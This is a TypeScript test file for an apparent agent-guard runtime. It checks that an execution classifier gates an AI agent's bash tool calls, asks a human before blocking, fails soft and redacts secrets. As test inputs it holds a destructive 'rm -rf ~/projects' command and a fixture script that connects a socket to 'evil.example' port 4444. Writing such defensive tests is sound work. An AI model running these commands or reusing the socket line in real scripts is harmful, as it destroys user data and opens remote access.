/**
 * Execution classifier (M17, PLAN-LOCAL-POLICY §3): paranoid-only, additive,
 * ASK-capped, fail-soft, behind the deterministic rails. Injected transport:
 * nothing here reaches the network.
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { createRuntime } from "../../src/index.ts";

const tempRoots: string[] = [];
after(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
});

type Verdict = number | "error";

async function harness(options: { profile?: string; verdict?: (state: string) => Verdict; withKey?: boolean }) {
  const repo = await mkdtemp(join(tmpdir(), "supplyguard-exec-"));
  const home = await mkdtemp(join(tmpdir(), "supplyguard-exec-home-"));
  tempRoots.push(repo, home);
  await mkdir(join(repo, "scripts"), { recursive: true });
  await writeFile(
    join(repo, ".supplyguard.yaml"),
    `version: 1\nprofile: ${options.profile ?? "paranoid"}\njev:\n  enabled: true\n`,
  );

  const sent: string[] = [];
  const prompts: string[] = [];
  const notices: string[] = [];
  const verdict = options.verdict ?? (() => 0.01);
  const runtime = createRuntime({
    home,
    env: options.withKey === false ? {} : ({ TYPESAFE_API_KEY: "tl-test-key" } as Record<string, string>),
    jev: {
      post: async (_url, body) => {
        const state = typeof body === "object" && body !== null && "state" in body ? String(body.state) : "";
        sent.push(state);
        const p = verdict(state);
        if (p === "error") throw new Error("HTTP 503");
        return { answers: { malicious: { type: "noul", noul: p } } };
      },
    },
  });
  const ctx = {
    cwd: repo,
    hasUI: true,
    mode: "tui" as const,
    ui: {
      select: async (title: string) => {
        prompts.push(title);
        return undefined; // no answer: never approval
      },
      confirm: async () => false,
      input: async () => undefined,
      notify: (message: string) => {
        notices.push(message);
      },
    },
    sessionManager: { getSessionId: () => "s" },
  };
  let id = 0;
  const run = (command: string) =>
    runtime.onToolCall({ toolName: "bash", toolCallId: String(++id), input: { command } }, ctx as never);
  return { repo, run, sent, prompts, notices };
}

test("a harmful verdict gates an otherwise-harmless command, ASK-capped", async () => {
  const h = await harness({ verdict: (state) => (state.includes("rm -rf") ? 0.97 : 0.01) });
  const blocked = await h.run("rm -rf ~/projects");
  assert.equal(blocked?.block, true, "no-response is not approval");
  assert.match(h.prompts.join("\n"), /execution classifier rates this command harmful \(p=0\.97\)/);
  assert.match(h.prompts.join("\n"), /\[ask\]/, "capped at ask: the human decides");
});

test("a benign verdict changes nothing; read-only commands never leave the machine", async () => {
  const h = await harness({});
  assert.equal((await h.run("mkdir build"))?.block, undefined, "benign proceeds, no prompt");
  assert.deepEqual(h.prompts, []);
  const before = h.sent.length;
  for (const command of ["ls -la", "git status", "cat README.md", "grep -r foo src"]) {
    assert.equal((await h.run(command))?.block, undefined, command);
  }
  assert.equal(h.sent.length, before, "invariant 9: read-only shapes are never sent");
});

test("unavailable classifier: warn, never block on its own", async () => {
  const h = await harness({ verdict: () => "error" });
  assert.equal((await h.run("mkdir build"))?.block, undefined, "D6: fail soft");
  assert.deepEqual(h.prompts, []);
});

test("paranoid-only: standard and hardened never consult it; no key, no call", async () => {
  for (const profile of ["standard", "hardened"]) {
    const h = await harness({ profile, verdict: () => 0.99 });
    assert.equal((await h.run("rm -rf ~/projects"))?.block, undefined, profile);
    assert.equal(h.sent.length, 0, `${profile} sends nothing`);
  }
  const keyless = await harness({ withKey: false, verdict: () => 0.99 });
  await keyless.run("rm -rf ~/projects");
  assert.equal(keyless.sent.length, 0);
});

test("stage 2 reads the executed script; redaction applies to both stages", async () => {
  const h = await harness({ verdict: (state) => (state.includes("socket.connect") ? 0.9 : 0.01) });
  await writeFile(
    join(h.repo, "scripts", "setup.py"),
    "import socket\ns=socket.socket();s.connect(('evil.example',4444))  # socket.connect\nAPI_KEY=supersecretvalue1234\n",
  );
  const blocked = await h.run("python3 scripts/setup.py --token=hunter2hunter2");
  assert.equal(blocked?.block, true, "the script's own verdict gates it");
  assert.match(h.prompts.join("\n"), /scripts\/setup\.py harmful/);
  const payload = h.sent.join("\n");
  assert.doesNotMatch(payload, /hunter2hunter2/, "command secrets are redacted");
  assert.doesNotMatch(payload, /supersecretvalue1234/, "script secrets are redacted");
});

test("rail 1: a sensitive script is never sent, and the human is told", async () => {
  const h = await harness({});
  await writeFile(join(h.repo, ".env"), "SECRET=never-leaves\n");
  await h.run("bash .env");
  assert.doesNotMatch(h.sent.join("\n"), /never-leaves/);
  assert.match(h.notices.join("\n"), /\.env is a sensitive path; it was not sent/);
  assert.equal(await readFile(join(h.repo, ".env"), "utf8"), "SECRET=never-leaves\n");
});

test("retry loops cost one call", async () => {
  const h = await harness({});
  await h.run("mkdir build");
  await h.run("mkdir build");
  assert.equal(h.sent.length, 1);
});
